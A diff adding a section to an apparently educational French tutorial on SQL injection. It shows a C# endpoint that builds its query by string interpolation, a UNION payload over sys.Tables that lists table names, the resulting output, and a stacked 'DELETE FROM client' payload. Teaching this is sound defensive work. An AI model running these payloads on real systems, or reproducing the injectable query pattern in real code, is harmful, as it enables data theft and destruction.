@@ -84,3 +84,83 @@ Résultat :
 
 Les tables n'existant plus, cela lève une erreur.
 
+
+
+## Trouver le nom des tables
+
+Méthode `c#` recevant la requête :
+
+```c#
+List<ClientDto> GetClientFiltering([FromBody] Filter filter, SqlConnection con)
+{
+    var cmd = new SqlCommand($"SELECT nom, prenom FROM Client WHERE prenom LIKE '{filter.FilterString}%'", con);
+    con.Open();
+    // ...
+```
+
+On va injecter ce code `SQL` dans la requête :
+
+```json
+GET https://localhost:7094/client/filter
+Content-Type: application/json
+
+{
+    "filterString": "Sc' UNION SELECT name COLLATE SQL_Latin1_General_CP1_CI_AS, type_desc COLLATE SQL_Latin1_General_CP1_CI_AS FROM sys.Tables  --"
+}
+```
+
+Ce qui donne le `SQL` complet
+
+```sql
+SELECT nom, prenom FROM Client WHERE prenom LIKE 's%' UNION SELECT name COLLATE SQL_Latin1_General_CP1_CI_AS, type_desc COLLATE SQL_Latin1_General_CP1_CI_AS FROM sys.Tables  -- %'
+```
+
+On utilise `--` pour annuler la fin de la requête et ne pas générer d'erreur de syntaxe `SQL`.
+
+L'encodage de la table `sys.Tables` n'est pas le même que celui de `Client`, on utilise `COLLATE ENC_NAME` pour ré-encoder à la volée :
+
+```sql
+SELECT name COLLATE SQL_Latin1_General_CP1_CI_AS, ...
+```
+
+Pour un `UNION`, il faut le même nombre de colonnes, c'est le seul intérêt d'ajouter `type_desc`.
+
+#### On récupère ainsi tous les noms de table !!!
+
+```json
+
+[
+  {
+    "nom": "bareme_salaire",
+    "prenom": "USER_TABLE"
+  },
+  {
+    "nom": "Bidon",
+    "prenom": "USER_TABLE"
+  },
+  {
+    "nom": "carte_fidelite",
+    "prenom": "USER_TABLE"
+  },
+  {
+    "nom": "Classique",
+    "prenom": "USER_TABLE"
+  },
+  {
+    "nom": "client",
+    "prenom": "USER_TABLE"
+  },
+  // ...
+```
+
+Maintenant on attaque la table voulue facilement :
+
+```http
+GET https://localhost:7094/client/filter
+Content-Type: application/json
+
+{
+    "filterString": "Sc'; DELETE FROM client  --"
+}
+```
+
